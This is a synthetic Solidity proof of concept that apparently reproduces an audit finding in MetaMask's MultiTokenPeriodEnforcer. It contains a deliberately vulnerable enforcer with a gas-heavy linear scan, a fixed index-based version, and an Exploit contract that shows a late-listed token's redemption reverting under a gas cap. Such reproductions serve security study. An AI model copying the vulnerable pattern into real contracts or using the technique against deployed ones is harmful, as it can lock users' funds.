// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  MetaMask MultiTokenPeriodEnforcer.getTermsInfo (ConsenSys, AuditVault #56801).
    SYNTHETIC, cheatcode-free, single transaction. No warp.

    getTermsInfo walks every 116-byte record to find a token. A token at the
    end of a long list costs far more gas than a token at index 0. Under the
    gas left after the rest of redeemDelegations, the late token reverts and
    the delegation cannot move that balance. The fixed enforcer takes an index. */

contract Mini {
    string public constant name = "Delegated Token";
    string public constant symbol = "DGT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MultiTokenPeriodEnforcer {
    Mini public immutable token;

    constructor(Mini token_) {
        token = token_;
    }

    function getTermsInfo(bytes calldata _terms, address _token)
        public
        pure
        returns (uint256 periodAmount_, uint256 periodDuration_, uint256 startDate_)
    {
        uint256 termsLength_ = _terms.length;
        require(termsLength_ != 0 && termsLength_ % 116 == 0, "MultiTokenPeriodEnforcer:invalid-terms-length");
        for (uint256 offset_ = 0; offset_ < termsLength_;) {
            // @> VULN: every record is scanned, so a token at the end blows the remaining gas
            address token_ = address(bytes20(_terms[offset_:offset_ + 20]));
            if (token_ == _token) {
                periodAmount_ = uint256(bytes32(_terms[offset_ + 20:offset_ + 52]));
                periodDuration_ = uint256(bytes32(_terms[offset_ + 52:offset_ + 84]));
                startDate_ = uint256(bytes32(_terms[offset_ + 84:offset_ + 116]));
                return (periodAmount_, periodDuration_, startDate_);
            }
            unchecked {
                offset_ += 116;
            }
        }
        revert("MultiTokenPeriodEnforcer:token-config-not-found");
    }

    function redeem(bytes calldata terms, address token_, address to) external {
        (uint256 periodAmount_,,) = getTermsInfo(terms, token_);
        Mini(token_).transfer(to, periodAmount_);
    }
}

contract MultiTokenPeriodEnforcerFixed {
    Mini public immutable token;

    constructor(Mini token_) {
        token = token_;
    }

    function getTermsInfo(bytes calldata _terms, address _token, uint256 tokenIndex)
        public
        pure
        returns (uint256 periodAmount_, uint256 periodDuration_, uint256 startDate_)
    {
        uint256 termsLength_ = _terms.length;
        require(termsLength_ != 0 && termsLength_ % 116 == 0, "MultiTokenPeriodEnforcer:invalid-terms-length");
        uint256 offset_ = tokenIndex * 116;
        require(offset_ + 116 <= termsLength_, "index");
        address tokenAddr = address(bytes20(_terms[offset_:offset_ + 20]));
        require(tokenAddr == _token, "MultiTokenPeriodEnforcer:token-config-not-found");
        periodAmount_ = uint256(bytes32(_terms[offset_ + 20:offset_ + 52]));
        periodDuration_ = uint256(bytes32(_terms[offset_ + 52:offset_ + 84]));
        startDate_ = uint256(bytes32(_terms[offset_ + 84:offset_ + 116]));
    }

    function redeem(bytes calldata terms, address token_, address to, uint256 tokenIndex) external {
        (uint256 periodAmount_,,) = getTermsInfo(terms, token_, tokenIndex);
        Mini(token_).transfer(to, periodAmount_);
    }
}

contract Exploit {
    address internal constant RECEIVER = 0x3333333333333333333333333333333333333333;
    uint256 internal constant N = 200;
    uint256 internal constant EARLY_AMOUNT = 100 ether;
    uint256 internal constant LOCKED_AMOUNT = 1_000 ether;

    Mini public token;
    MultiTokenPeriodEnforcer public enforcer;
    uint256 public gasFirst;
    uint256 public gasLast;
    uint256 public cap;
    uint256 public decodedLast;
    uint256 public earlyOk;
    uint256 public lateOk;
    uint256 public lockedLeft;
    bytes public shortTerms;
    bytes public longTerms;

    function _poke(bytes memory b, uint256 i, address who, uint256 amount) internal pure {
        uint256 off = i * 116;
        assembly {
            let p := add(add(b, 32), off)
            mstore(p, shl(96, who))
            mstore(add(p, 20), amount)
            mstore(add(p, 52), 86400)
            mstore(add(p, 84), 1)
        }
    }

    function run() external {
        token = new Mini();
        enforcer = new MultiTokenPeriodEnforcer(token);
        token.mint(address(enforcer), EARLY_AMOUNT + LOCKED_AMOUNT);
        bytes memory builtShort = new bytes(116);
        _poke(builtShort, 0, address(token), EARLY_AMOUNT);
        shortTerms = builtShort;
        bytes memory builtLong = new bytes(N * 116);
        for (uint256 i; i < N; ++i) {
            address who = i + 1 == N ? address(token) : address(uint160(0xA000 + i));
            uint256 amount = i + 1 == N ? LOCKED_AMOUNT : 1 ether;
            _poke(builtLong, i, who, amount);
        }
        longTerms = builtLong;
        uint256 g0 = gasleft();
        enforcer.getTermsInfo(shortTerms, address(token));
        gasFirst = g0 - gasleft();
        g0 = gasleft();
        (uint256 decoded,,) = enforcer.getTermsInfo(longTerms, address(token));
        gasLast = g0 - gasleft();
        decodedLast = decoded;
        cap = gasFirst + 45_000;
        (bool okEarly,) = address(enforcer).call{gas: cap}(
            abi.encodeWithSelector(enforcer.redeem.selector, shortTerms, address(token), RECEIVER)
        );
        earlyOk = okEarly ? 1 : 0;
        (bool okLate,) = address(enforcer).call{gas: cap}(
            abi.encodeWithSelector(enforcer.redeem.selector, longTerms, address(token), RECEIVER)
        );
        lateOk = okLate ? 1 : 0;
        lockedLeft = token.balanceOf(address(enforcer));
    }
}
